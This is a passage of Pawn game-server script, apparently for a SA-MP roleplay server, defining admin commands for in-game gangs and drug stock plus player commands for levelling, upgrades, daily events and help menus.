                 format(string, sizeof(string), "AdmCmd: {A4A4A4}%s {FF6347}has been given a gang cookie.", FamInfo[idx][fName]);
   	    		 SendClientMessage(i, COLOR_LIGHTRED, string);
          	  }
          	  else if(FamInfo[idx][fColor] == 11)
          	  {
        	     format(string, sizeof(string), "AdmCmd: {000000}%s {FF6347}has been given a gang cookie.", FamInfo[idx][fName]);
   	    		 SendClientMessage(i, COLOR_LIGHTRED, string);
          	  }
          	  else
          	  {
                 format(string, sizeof(string), "AdmCmd: %s has been given a gang cookie.", FamInfo[idx][fName]);
   	    		 SendClientMessage(i, COLOR_LIGHTRED, string);
			  }
	    	}
	    }
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:editpoint(playerid, var[])
{
	new string[128], point, time;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pGangMod])
	{
      	if(sscanf(var, "ii", point, time)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /editpoint [point] [time]");
    	if(point < 1 || point > 5) return SendClientMessage(playerid, COLOR_GRAD2, "Points are between 1 and 5.");
    	if(time < 0) return SendClientMessage(playerid, COLOR_GRAD2, "You have entered an invalid time.");
    	point = point-1;
        PointInfo[point][pTime] = time;
        format(string, sizeof(string), "AdminWarning: %s has set the %s point to be capturable in %d hours.", GetName(playerid), PointInfo[point][pName], PointInfo[point][pTime]);
        SendAdminMessage(COLOR_ADMWARN, string);
    }
    else
    {
        NoAuth(playerid);
	}
	return 1;
}
IRP:fedit(playerid, var[])
{
	new string[128], option[32], option2[32], idx, skin, skinid, veh, vehid, col1, col2, cookies;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pGangMod])
    {
    	if(sscanf(var, "is[32]", idx, option))
    	{
    		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /fedit [slot] [option]");
    		SendClientMessage(playerid, COLOR_GRAD2, "** [OPTIONS]: color | skin | name | leader | cookies");
    		return 1;
    	}
    	if(idx < 1 || idx > 7) return SendClientMessage(playerid, COLOR_GRAD2, "Families are between 1 and 7.");
    	if(!FamInfo[idx][fTaken]) return SendClientMessage(playerid, COLOR_GRAD2, "Family slot is not being used.");
        if(!strcmp(option, "skin", true, 4))
        {
    	    if(sscanf(var, "is[32]ii", idx, option, skin, skinid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /fedit [familyslot] skin [skinslot] [skinid]");
    		if(skin < 1 || skin > 7) return SendClientMessage(playerid, COLOR_GRAD2, "Skin slots are between 1 and 7.");
    		skin = skin-1;
    		FamInfo[idx][fSkins][skin] = skinid;
    		format(string, sizeof(string), "AdminWarning: %s has set family %d's skin slot %d to %d.", GetName(playerid), idx, skin+1, skinid);
    		SendAdminMessage(COLOR_ADMWARN,  string);
            return 1;
    	}
    	else if(!strcmp(option, "cookies", true, 4))
        {
    	    if(sscanf(var, "is[32]i", idx, option, cookies)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /fedit [familyslot] cookies [number]");
    		FamInfo[idx][fCookies] += cookies;
    		format(string, sizeof(string), "AdminWarning: %s has given family %d's %d cookie.", GetName(playerid), idx, cookies);
    		SendAdminMessage(COLOR_ADMWARN,  string);
            return 1;
    	}
    	else if(!strcmp(option, "color", true, 4))
    	{
    	    if(sscanf(var, "is[32]s[32]", idx, option, option2))
			{
			    SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /fedit [familyslot] color [color]");
			    SendClientMessage(playerid, COLOR_GRAD2, "** [COLORS]: {00FFFF}lightblue - {0000FF}blue - {FF0000}red - {B40404}darkred - {FFFF00}yellow - {DF7401}orange - {088A08}green");
			    SendClientMessage(playerid, COLOR_GRAD2, "** [COLORS]: {CC2EFA}purple - {00FF00}lime - {A4A4A4}grey - {000000}black");
			    return 1;
			}
			if(!strcmp(option2, "lightblue", true))
    	    {
    	    	FamInfo[idx][fColor] = 1;
    	    	format(string, sizeof(string), "AdminWarning: %s has adjusted family %d's {00FFFF}color", GetName(playerid), idx);
    	    	SendAdminMessage(COLOR_ADMWARN,  string);
    	    }
			else if(!strcmp(option2, "blue", true))
    	    {
    	    	FamInfo[idx][fColor] = 2;
    	    	format(string, sizeof(string), "AdminWarning: %s has adjusted family %d's {0000FF}color", GetName(playerid), idx);
    	    	SendAdminMessage(COLOR_ADMWARN,  string);
    	    }
    	    else if(!strcmp(option2, "red", true))
    	    {
    	    	FamInfo[idx][fColor] = 3;
    	    	format(string, sizeof(string), "AdminWarning: %s has adjusted family %d's {FF0000}color", GetName(playerid), idx);
    	    	SendAdminMessage(COLOR_ADMWARN,  string);
    	    }
    	    else if(!strcmp(option2, "darkred", true))
    	    {
    	    	FamInfo[idx][fColor] = 4;
    	    	format(string, sizeof(string), "AdminWarning: %s has adjusted family %d's {B40404}color", GetName(playerid), idx);
    	    	SendAdminMessage(COLOR_ADMWARN,  string);
    	    }
    	    else if(!strcmp(option2, "yellow", true))
    	    {
    	    	FamInfo[idx][fColor] = 5;
    	    	format(string, sizeof(string), "AdminWarning: %s has adjusted family %d's {FFFF00}color.", GetName(playerid), idx);
    	    	SendAdminMessage(COLOR_ADMWARN,  string);
    	    }
    	    else if(!strcmp(option2, "orange", true))
    	    {
    	    	FamInfo[idx][fColor] = 6;
    	    	format(string, sizeof(string), "AdminWarning: %s has adjusted family %d's {DF7401}color.", GetName(playerid), idx);
    	    	SendAdminMessage(COLOR_ADMWARN,  string);
    	    }
    	    else if(!strcmp(option2, "green", true))
    	    {
    	    	FamInfo[idx][fColor] = 7;
    	    	format(string, sizeof(string), "AdminWarning: %s has adjusted family %d's {088A08}color", GetName(playerid), idx);
    	    	SendAdminMessage(COLOR_ADMWARN,  string);
    	    }
    	    else if(!strcmp(option2, "purple", true))
    	    {
    	    	FamInfo[idx][fColor] = 8;
    	    	format(string, sizeof(string), "AdminWarning: %s has adjusted family %d's {CC2EFA}color", GetName(playerid), idx);
    	    	SendAdminMessage(COLOR_ADMWARN,  string);
    	    }
    	    else if(!strcmp(option2, "lime", true))
    	    {
    	    	FamInfo[idx][fColor] = 9;
    	    	format(string, sizeof(string), "AdminWarning: %s has adjusted family %d's {00FF00}color", GetName(playerid), idx);
    	    	SendAdminMessage(COLOR_ADMWARN,  string);
    	    }
    	    else if(!strcmp(option2, "grey", true))
    	    {
    	    	FamInfo[idx][fColor] = 10;
    	    	format(string, sizeof(string), "AdminWarning: %s has adjusted family %d's {A4A4A4}color", GetName(playerid), idx);
    	    	SendAdminMessage(COLOR_ADMWARN,  string);
    	    }
    	    else if(!strcmp(option2, "black", true))
    	    {
    	    	FamInfo[idx][fColor] = 11;
    	    	format(string, sizeof(string), "AdminWarning: %s has adjusted family %d's {000000}color", GetName(playerid), idx);
    	    	SendAdminMessage(COLOR_ADMWARN,  string);
    	    }
    	    return 1;
    	}
    	else if(!strcmp(option, "name", true, 4))
    	{
    	    if(sscanf(var, "is[32]s[32]", idx, option, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /fedit [familyslot] name [familyname]");
    		format(FamInfo[idx][fName], 32, "%s", var);
     		format(string, sizeof(string), "AdminWarning: %s has set family %d's name to %s.", GetName(playerid), idx, var);
    		SendAdminMessage(COLOR_ADMWARN,  string);
    	}
     	else if(!strcmp(option, "leader", true, 6))
    	{
     		if(sscanf(var, "is[32]s[32]", idx, option, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /fedit [familyslot] leader [leadername]");
	    	format(FamInfo[idx][fLeader], 32, "%s", var);
	    	format(string, sizeof(string), "AdminWarning: %s has set family %d's leader name to %s.", GetName(playerid), idx, var);
	    	SendAdminMessage(COLOR_ADMWARN,  string);
    	}
    	else if(!strcmp(option, "vehicles", true, 7))
    	{
     		if(sscanf(var, "is[32]iiii", idx, option, veh, vehid, col1, col2)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /fedit [familyslot] vehicle [vehiclelot] [vehiclemodel] [color1] [color2]");
    		if(veh < 1 || veh > 5) return SendClientMessage(playerid, COLOR_GRAD2, "Vehicle slots are between 1 and 5.");
	    	veh = veh-1;
	    	if(FamInfo[idx][fVehType][veh])
	    	{
	    	    FamInfo[idx][fVehType][veh] = 0;
	    	    FamInfo[idx][fVehCoX][veh] = 0;
	    		FamInfo[idx][fVehCoY][veh] = 0;
	    		FamInfo[idx][fVehCoZ][veh] = 0;
	    		FamInfo[idx][fVehRot][veh] = 0;
	    		FamInfo[idx][fVehCol1][veh] = 0;
	    		FamInfo[idx][fVehCol2][veh] = 0;
	    		DestroyVehicle(FamInfo[idx][fVeh][veh]);
    		}
    		if(vehid)
	    	{
	    		FamInfo[idx][fVehType][veh] = vehid;
	    		GetPlayerPos(playerid, FamInfo[idx][fVehCoX][veh], FamInfo[idx][fVehCoY][veh], FamInfo[idx][fVehCoZ][veh]);
	    		GetPlayerFacingAngle(playerid, FamInfo[idx][fVehRot][veh]);
	    		FamInfo[idx][fVehCol1][veh] = col1;
	    		FamInfo[idx][fVehCol2][veh] = col2;
	    		FamInfo[idx][fVeh][veh] = CreateVehicle(vehid, FamInfo[idx][fVehCoX][veh], FamInfo[idx][fVehCoY][veh], FamInfo[idx][fVehCoZ][veh], FamInfo[idx][fVehRot][veh], FamInfo[idx][fVehCol1][veh], FamInfo[idx][fVehCol2][veh], 1200);
	            ChangeVehicleColor(FamInfo[idx][fVeh][veh], FamInfo[idx][fVehCol1][veh], FamInfo[idx][fVehCol2][veh]);
	            Fam[FamInfo[idx][fVeh][veh]] = idx;
	    		format(string, sizeof(string), "AdminWarning: %s has set family %d's vehicle slot %d to ID %d.", GetName(playerid), idx, veh+1, vehid);
	    		SendAdminMessage(COLOR_ADMWARN,  string);
 	    	}
    	}
    	else SendClientMessage(playerid, COLOR_GRAD2, "Invalid option.");
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}

IRP:fcreate(playerid, var[])
{
	new string[128], user, idx;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pGangMod])
    {
    	if(sscanf(var, "ui", user, idx)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /fcreate [playerid] [slot]");
        if(!Logged(user)) return NoLoginB(playerid);
    	if(idx < 1 || idx > 7) return SendClientMessage(playerid, COLOR_GRAD2, "Families are between 1 and 7.");
    	if(FamInfo[idx][fTaken]) return SendClientMessage(playerid, COLOR_GRAD2, "Family slot is already in use.");
    	FamInfo[idx][fTaken] = 1;
    	FamInfo[idx][fMembers] ++;
    	Player[user][pFam] = idx;
    	Player[user][pFamRank] = 6;
    	FamInfo[idx][fStrikes] = 0;
    	FamInfo[idx][fPissAchievment] = 0;
   		FamInfo[idx][fHQAchievment] = 0;
   		FamInfo[idx][fSafeAchievment] = 0;
   		FamInfo[idx][fPointAchievment] = 0;
        FamInfo[idx][fCookies] = 0;
    	FamInfo[idx][fLevel] = 1;
    	FamInfo[idx][fVW] = idx+1;
    	format(FamInfo[idx][fLeader], MAX_PLAYER_NAME, "%s", GetName(user));
    	format(string, sizeof(string), "AdminWarning: %s has given %s family slot %d.", GetName(playerid), GetName(user), idx);
    	SendAdminMessage(COLOR_ADMWARN,  string);
    	Log("Log/Admins/families.log", string);
    	format(string, sizeof(string), " %s has given you family slot {01A9DB}%d {33CCFF}ownership.", GetName(playerid), idx);
    	SendClientMessage(user, COLOR_LIGHTBLUE, string);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}

IRP:fstrike(playerid, var[])
{
	new string[128], idx;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pGangMod])
	{
    	if(sscanf(var, "i", idx)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /fstrike [slot]");
    	if(idx < 1 || idx > 7) return SendClientMessage(playerid, COLOR_GRAD2, "Families are between 1 and 7.");
    	if(!FamInfo[idx][fTaken]) return SendClientMessage(playerid, COLOR_GRAD2, "Family slot is not being used.");
    	FamInfo[idx][fStrikes] ++;
    	format(string, sizeof(string), "AdminWarning: %s has given family slot %d a strike.", GetName(playerid), idx);
    	SendAdminMessage(COLOR_ADMWARN,  string);
    	Log("Log/Admins/families.log", string);
    	if(FamInfo[idx][fStrikes] >= 3)
    	{
    		format(string, sizeof(string), "AdminWarning: %s has disbanded family slot %d. (3 Strikes)", GetName(playerid), idx);
	    	SendAdminMessage(COLOR_ADMWARN,  string);
    		Log("Log/Admins/families.log", string);
     		foreach(Player, i)
    		{
	     	    if(Logged(i))
	    	    {
	    			if(FamInfo[idx][fColor] == 2)
	    			{
                	    format(string, sizeof(string), "FamCmd: {0000FF}%s {FF6347}has been disbanded due to recieving 3 strikes.", FamInfo[idx][fName]);
	    	    		SendClientMessage(i, COLOR_LIGHTRED, string);
                	}
            	    else if(FamInfo[idx][fColor] == 1)
	            	{
                 	    format(string, sizeof(string), "FamCmd: {00FFFF}%s {FF6347}has been disbanded due to recieving 3 strikes.", FamInfo[idx][fName]);
	    	    		SendClientMessage(i, COLOR_LIGHTRED, string);
           	        }
            		else if(FamInfo[idx][fColor] == 3)
	               	{
                	    format(string, sizeof(string), "FamCmd: {FF0000}%s {FF6347}has been disbanded due to recieving 3 strikes.", FamInfo[idx][fName]);
	    	    		SendClientMessage(i, COLOR_LIGHTRED, string);
                	}
                	else if(FamInfo[idx][fColor] == 4)
	               	{
                	    format(string, sizeof(string), "FamCmd: {B40404}%s {FF6347}has been disbanded due to recieving 3 strikes.", FamInfo[idx][fName]);
	    	    		SendClientMessage(i, COLOR_LIGHTRED, string);
                	}
                	else if(FamInfo[idx][fColor] == 5)
	               	{
                	    format(string, sizeof(string), "FamCmd: {FFFF00}%s {FF6347}has been disbanded due to recieving 3 strikes.", FamInfo[idx][fName]);
	    	    		SendClientMessage(i, COLOR_LIGHTRED, string);
                	}
                	else if(FamInfo[idx][fColor] == 6)
	               	{
                	    format(string, sizeof(string), "FamCmd: {DF7401}%s {FF6347}has been disbanded due to recieving 3 strikes.", FamInfo[idx][fName]);
	    	    		SendClientMessage(i, COLOR_LIGHTRED, string);
                	}
                	else if(FamInfo[idx][fColor] == 7)
	               	{
                	    format(string, sizeof(string), "FamCmd: {088A08}%s {FF6347}has been disbanded due to recieving 3 strikes.", FamInfo[idx][fName]);
	    	    		SendClientMessage(i, COLOR_LIGHTRED, string);
                	}
                	else if(FamInfo[idx][fColor] == 8)
	               	{
                	    format(string, sizeof(string), "FamCmd: {CC2EFA}%s {FF6347}has been disbanded due to recieving 3 strikes.", FamInfo[idx][fName]);
	    	    		SendClientMessage(i, COLOR_LIGHTRED, string);
                	}
                	else if(FamInfo[idx][fColor] == 9)
	               	{
                	    format(string, sizeof(string), "FamCmd: {00FF00}%s {FF6347}has been disbanded due to recieving 3 strikes.", FamInfo[idx][fName]);
	    	    		SendClientMessage(i, COLOR_LIGHTRED, string);
                	}
                	else if(FamInfo[idx][fColor] == 10)
	               	{
                	    format(string, sizeof(string), "FamCmd: {A4A4A4}%s {FF6347}has been disbanded due to recieving 3 strikes.", FamInfo[idx][fName]);
	    	    		SendClientMessage(i, COLOR_LIGHTRED, string);
                	}
                	else if(FamInfo[idx][fColor] == 11)
	               	{
                	    format(string, sizeof(string), "FamCmd: {000000}%s {FF6347}has been disbanded due to recieving 3 strikes.", FamInfo[idx][fName]);
	    	    		SendClientMessage(i, COLOR_LIGHTRED, string);
                	}
                	else
                	{
                        format(string, sizeof(string), "FamCmd: %s has been disbanded due to recieving 3 strikes.", FamInfo[idx][fName]);
   	             	    SendClientMessage(i, COLOR_LIGHTRED, string);
			        }
                }
                if(Player[i][pFam] == idx)
	            {
	                Player[i][pFam] = 0;
	                Player[i][pFamRank] = 0;
	                format(string, sizeof(string), "FamCmd: %s has disbanded your family, you have been autokicked from the family.", GetName(playerid));
	        		SendClientMessage(i, COLOR_LIGHTBLUE, string);
 	            }
	   	    }
	    	FamInfo[idx][fTaken] = 0;
	    	format(FamInfo[idx][fName], 32, "None");
	    	format(FamInfo[idx][fMOTD], 64, "");
	    	FamInfo[idx][fColor] = 0;
	    	FamInfo[idx][fLevel] = 1;
	    	format(FamInfo[idx][fLeader], MAX_PLAYER_NAME, "None");
    		FamInfo[idx][fMembers] = 0;
    		FamInfo[idx][fCookies] = 0;
    		FamInfo[idx][fPissAchievment] = 0;
    		FamInfo[idx][fHQAchievment] = 0;
    		FamInfo[idx][fSafeAchievment] = 0;
    		FamInfo[idx][fPointAchievment] = 0;
    		FamInfo[idx][fSafeX] = 0;
    		FamInfo[idx][fSafeY] = 0;
    		FamInfo[idx][fSafeZ] = 0;
    		FamInfo[idx][fHQX] = 0;
    		FamInfo[idx][fHQY] = 0;
    		FamInfo[idx][fHQZ] = 0;
    		FamInfo[idx][fStrikes] = 0;
	    	FamInfo[idx][fMoney] = 0;
    		FamInfo[idx][fMats] = 0;
    		FamInfo[idx][fWeed] = 0;
    		FamInfo[idx][fSeeds] = 0;
	    	FamInfo[idx][fcocaine] = 0;
    		format(FamInfo[idx][fRank1], 32, "");
	    	format(FamInfo[idx][fRank2], 32, "");
	     	format(FamInfo[idx][fRank3], 32, "");
	    	format(FamInfo[idx][fRank4], 32, "");
	    	format(FamInfo[idx][fRank5], 32, "");
     		format(FamInfo[idx][fRank6], 32, "");
    		FamInfo[idx][fSkins][0] = 0;
    		FamInfo[idx][fSkins][1] = 0;
     		FamInfo[idx][fSkins][2] = 0;
    		FamInfo[idx][fSkins][3] = 0;
    		FamInfo[idx][fSkins][4] = 0;
	    	FamInfo[idx][fSkins][5] = 0;
	    	FamInfo[idx][fSkins][6] = 0;
    		DestroyDynamicPickup(FamInfo[idx][fPickup]);
    		DestroyDynamic3DTextLabel(FamInfo[idx][fText]);
    		DestroyDynamicPickup(FamInfo[idx][fHQPickup]);
    		DestroyDynamic3DTextLabel(FamInfo[idx][fHQText]);
    		for(new veh=0; veh<5; veh++)
	    	{
    			if(FamInfo[idx][fVehType][veh])
    			{
	    		    FamInfo[idx][fVehType][veh] = 0;
	    		    FamInfo[idx][fVehCoX][veh] = 0;
		    		FamInfo[idx][fVehCoY][veh] = 0;
	    			FamInfo[idx][fVehCoZ][veh] = 0;
		    		FamInfo[idx][fVehRot][veh] = 0;
		    		FamInfo[idx][fVehCol1][veh] = 0;
		    		FamInfo[idx][fVehCol2][veh] = 0;
		    		DestroyVehicle(FamInfo[idx][fVeh][veh]);
		    	}
    		}
    	}
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:editdrugs(playerid, var[])
{
	new string[128], option[8], amount;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pGangMod]) return NoAuth(playerid);
	if(sscanf(var, "s[8]i", option, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /editdrugs [type] [amount]");
		format(string, sizeof(string), "Seed: %d - Cocaine: %d", Seed, cocaine);
		SendClientMessage(playerid, COLOR_GRAD2, string);
		return 1;
	}
	if(amount < 0 || amount > 2000) return SendClientMessage(playerid, COLOR_GRAD2, "Drugs amount is between 0 and 2000.");
	if(!strcmp(option, "seed", true, 4))
	{
	    Seed = amount;
		format(string, sizeof(string), "Seed Pickup\n{01A9DB}/buyseed {FFFFFF}to get seed\nAvailable Stock: {01A9DB}%d{FFFFFF}/{01A9DB}2000", Seed);
		UpdateDynamic3DTextLabelText(SeedsText, COLOR_WHITE, string);
		format(string, sizeof(string), "AdminWarning: %s has set the Seeds House's stock to %d grams.", GetName(playerid), amount);
		SendAdminMessage(COLOR_ADMWARN, string);
		Log("Log/Admins/editdrugs.log", string);
	}
	else if(!strcmp(option, "cocaine", true, 5))
	{
	    cocaine = amount;
		format(string, sizeof(string), "Cocaine Pickup\n{01A9DB}/buycocaine {FFFFFF}to get cocaine\nAvailable Stock: {01A9DB}%d{FFFFFF}/{01A9DB}2000", cocaine);
		UpdateDynamic3DTextLabelText(cocaineText, COLOR_WHITE, string);
		format(string, sizeof(string), "AdminWarning: %s has set the cocaine Lab's stock to %d grams.", GetName(playerid), amount);
		SendAdminMessage(COLOR_ADMWARN, string);
		Log("Log/Admins/editdrugs.log", string);
	}
	return 1;
}
//--------------------------------------------------------------[Player Commands]-----------------------------------

IRP:buylevel(playerid, params[])
{
			if(Player[playerid][pLevel] >= 0)
			{
					new nxtlevel = Player[playerid][pLevel]+1;
					new string[128];
					new costlevel = nxtlevel*levelcost;
					new expamount = nxtlevel*levelexp;
					if(Player[playerid][pMoney] < costlevel)
					{
						format(string, sizeof(string), "You can't afford to buy a new level. ($%d)",costlevel);
						SendClientMessage(playerid, COLOR_GRAD2, string);
						return 1;
					}
					else if(Player[playerid][pExp] < expamount)
					{
                        format(string, sizeof(string), "You don't have enough respect points to buy the new level. {298A08}(Needed: %d) (Current: %d)",expamount,Player[playerid][pExp]);
						SendClientMessage(playerid, COLOR_GRAD2, string);
						return 1;
					}
					else
					{
						format(string, sizeof(string), "Congratulation, You have been leveled up. (%d)",nxtlevel);
						SendClientMessage(playerid, COLOR_INT, string);
						GiveZamoraMoney(playerid, (0 - costlevel));
						Player[playerid][pLevel]++;
                        SetPlayerScore(playerid, Player[playerid][pLevel]);
						Player[playerid][pExp] -= expamount;
						if(Player[playerid][pVIP] == 3)
						{
				    		Player[playerid][pUpgradePoints] += 2;
				    		SendClientMessage(playerid, COLOR_YELLOW, "You've recieved 2 upgrade points.");
				    	}
				    	if(Player[playerid][pVIP] == 4)
						{
				    		Player[playerid][pUpgradePoints] += 3;
				    		SendClientMessage(playerid, COLOR_YELLOW, "You've recieved 3 upgrade points.");
				    	}
				    	else
				    	{
                            Player[playerid][pUpgradePoints] ++;
				    		SendClientMessage(playerid, COLOR_YELLOW, "You've recieved an upgrade point.");
				    	}
						new total = Player[playerid][pExp];
						if(total > 0)
						{
						    Player[playerid][pExp] = total;
						}
						else
						{
						    Player[playerid][pExp] = 0;
						}
					}
				}
            return 1;
}
IRP:upgrade(playerid, var[])
{
   	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(sscanf(var,"s[32]", var))
   	{
        SendClientMessage(playerid,COLOR_LIGHTRED, "_______________________________________________");
        SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /upgrade [upgrades]");
        SendClientMessage(playerid, COLOR_GRAD2, "** [UPGRADES]: Health | Armor | HouseSafe");
        format(string, sizeof(string), "* You have %d upgrade points.", Player[playerid][pUpgradePoints]);
    	SendClientMessage(playerid, COLOR_YELLOW, string);
    	SendClientMessage(playerid,COLOR_LIGHTRED, "_______________________________________________");
  	    return 1;
   	}
   	if(!strcmp(var, "health", true))
   	{
		if(!Player[playerid][pUpgradePoints]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have any upgrade points for it.");
		if(Player[playerid][pHealthUpgrade] == 4) return SendClientMessage(playerid, COLOR_GRAD2, "You can't upgrade it anymore.");
		Player[playerid][pHealthUpgrade] ++;
		Player[playerid][pUpgradePoints] --;
		SendClientMessage(playerid, COLOR_INT, "You've sucessfully upgraded your health spawn after hospital.");
   	}
   	if(!strcmp(var, "armor", true))
   	{
        if(Player[playerid][pUpgradePoints] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have any upgrade points for it.");
        if(Player[playerid][pArmorUpgrade] == 4) return SendClientMessage(playerid, COLOR_GRAD2, "You can't upgrade it anymore.");
		Player[playerid][pArmorUpgrade] ++;
		Player[playerid][pUpgradePoints] -= 2;
		SendClientMessage(playerid, COLOR_INT, "You've sucessfully upgraded your armor spawn after hospital.");
   	}
   	if(!strcmp(var, "housesafe", true))
   	{
		new house;
		new idx = Player[playerid][pHouse];
		new idxx = Player[playerid][pVHouse];
        if(!Player[playerid][pHouse] && !Player[playerid][pVHouse]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't own a house.");
        if(sscanf(var, "s[32]d", var, house)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /upgrade housesafe [1-2]");
        switch(house)
     	{
        	case 1:
        	{
                if(Player[playerid][pUpgradePoints] < 3) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have any upgrade points for it.");
                if(HouseInfo[idx][hsafe] == 2) return SendClientMessage(playerid, COLOR_GRAD2, "You can't upgrade it anymore.");
         		HouseInfo[idx][hsafe] ++;
        		Player[playerid][pUpgradePoints] -= 3;
         		SendClientMessage(playerid, COLOR_INT, "You've sucessfully upgraded your house safe.");
         	}
         	case 2:
        	{
                if(Player[playerid][pUpgradePoints] < 3) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have any upgrade points for it.");
                if(HouseInfo[idxx][hsafe] == 2) return SendClientMessage(playerid, COLOR_GRAD2, "You can't upgrade it anymore.");
         		HouseInfo[idxx][hsafe] ++;
        		Player[playerid][pUpgradePoints] -= 3;
         		SendClientMessage(playerid, COLOR_INT, "You've sucessfully upgraded your house safe.");
         	}
         }
   	}
   	return 1;
}
IRP:day(playerid, var[])
{
    if(!Logged(playerid)) return NoLogin(playerid);
    if(DayPaycheck == 1)
    {
            SendClientMessage(playerid, COLOR_INT, "Today is Day Of World Wide Economics.");
           	SendClientMessage(playerid, 0x5FB404FF, "|______ Roleplay Explanation ______|");
  		    SendClientMessage(playerid, COLOR_WHITE, "Today The Government won a big project, Therefore the paycheck salaries have been raised.");
   			SendClientMessage(playerid, COLOR_INT, " ((Today you get 25 percent bigger paychecks.))");
         	SendClientMessage(playerid, 0x5FB404FF, "_______________________________________________");
    }
    else if(DayRespect == 1)
    {
            SendClientMessage(playerid, COLOR_INT, "Today is Day Of Liberty.");
            SendClientMessage(playerid,0x5FB404FF, "|______ Roleplay Explanation ______|");
            SendClientMessage(playerid,COLOR_WHITE, "Today we celeberate the Day Of Liberty,therefore respect is easily earned on the streets.");
            SendClientMessage(playerid,COLOR_INT, "((Today you get double respect.))");
            SendClientMessage(playerid,0x5FB404FF, "_______________________________________________");
    }
    else if(DayNoShops == 1)
    {
            SendClientMessage(playerid, COLOR_INT, "Today is Sunday.");
            SendClientMessage(playerid,0xFF0000FF, "|______ Roleplay Explanation ______|");
            SendClientMessage(playerid,COLOR_WHITE, "It's Sunday, all shops are closed.");
            SendClientMessage(playerid,COLOR_INT, "  ((Today you can't enter any shops/businesses.))");
            SendClientMessage(playerid,0xFF0000FF, "_______________________________________________");
    }
    else if(DayZeroGravity == 1)
    {
            SendClientMessage(playerid, COLOR_INT, "Today is Day Of Restricted Air Space.");
            SendClientMessage(playerid,0xFF0000FF, "|______ Roleplay Explanation ______|");
            SendClientMessage(playerid,COLOR_WHITE, "Today all travelling agency are closed.");
            SendClientMessage(playerid,COLOR_INT, "  ((You can't fly any plane.))");
            SendClientMessage(playerid,0xFF0000FF, "_______________________________________________");
	}
	else if(DayUnbreakable == 1)
    {
            SendClientMessage(playerid, COLOR_INT, "Today is Day Of Unstoppable.");
            SendClientMessage(playerid,0x5FB404FF, "|______ Roleplay Explanation ______|");
            SendClientMessage(playerid,COLOR_WHITE, "The atmosphere is different today, It makes you feel stronger.");
            SendClientMessage(playerid,COLOR_INT, "  ((Max health and armor is 150.))");
            SendClientMessage(playerid,0x5FB404FF, "_______________________________________________");
	}
	else if(DayRespect == 0 || DayPaycheck == 0 || DayNoShops == 0 || DayZeroGravity == 0)
	{
			SendClientMessage(playerid, COLOR_INT, "Today is just an ordinary day.");
	}
	return 1;
}
IRP:help(playerid, var[])
{
    if(!Logged(playerid)) return NoLogin(playerid);
    ShowPlayerDialog(playerid,DIALOG_HELP,DIALOG_STYLE_LIST,"Help","General help\nChat help\nFamily help\nVehicle help\nFish help\nHouse help\nBusiness help\nJob help\nFaction help\nBank help\nPaintball help\nGarage help\nAdmin help","Select", "Cancel");
	return 1;
}
IRP:factionhelp(playerid, var[])
{
	if(!Logged(playerid)) return NoLogin(playerid);
	if(IsACop(playerid))
	{
	   SendClientMessage(playerid, COLOR_BLUE, "* LSPD Commands: {FFFFFF}/r /d /m(egaphone) /members /su /arrest /deliver /ticket /tazer");
	   SendClientMessage(playerid, COLOR_BLUE, "* LSPD Commands: {FFFFFF}/showbadge /locker /mdc /detain /cuff /uncuff /take /door");
	   SendClientMessage(playerid, COLOR_BLUE, "* LSPD Commands: {FFFFFF}/deployspike /destroyspike /destroyspikes /deploycone /destroycone /destroycones");
	   SendClientMessage(playerid, COLOR_BLUE, "* LSPD Commands: {FFFFFF}/deployradar /removeradar /radaron /radaroff /checkload");
	   SendClientMessage(playerid, COLOR_BLUE, "* LSPD Commands: {FFFFFF}/setdivision /invite /uninvite /resfacveh /rank /gov /dinvite /duninvite");
	   return 1;
	}
	if(IsFBI(playerid))
	{
       SendClientMessage(playerid, COLOR_FBI, "* FBI Commands: {FFFFFF}/deployspike /destroyspike /destroyspikes /m(egaphone) /su /ticket /setdivision");
	   SendClientMessage(playerid, COLOR_FBI, "* FBI Commands: {FFFFFF}/arrest /deliver /showbadge /locker /gov /mdc /detain /cuff /uncuff /tazer /rank");
	   SendClientMessage(playerid, COLOR_FBI, "* FBI Commands: {FFFFFF}/r /d /elevator /members /invite /uninvite /take /resfacveh /dinvite /duninvite");
	   return 1;
	}
	if(IsDOC(playerid))
	{
       SendClientMessage(playerid, COLOR_DOC, "* DOC Commands: {FFFFFF}/deliver /showbadge /locker /gov /detain ");
	   SendClientMessage(playerid, COLOR_DOC, "* DOC Commands: {FFFFFF}/cuff /uncuff /tazer /rank /door");
	   SendClientMessage(playerid, COLOR_DOC, "* DOC Commands: {FFFFFF}/r /d /members /invite /uninvite /take /resfacveh");
	   return 1;
	}
	if(IsAReporter(playerid))
	{
       SendClientMessage(playerid, COLOR_NEWS, "* NEWS Commands: {FFFFFF}/san /news /live /members /invite /uninvite /rank /resfacveh");
	   return 1;
	}
	if(IsAGov(playerid))
	{
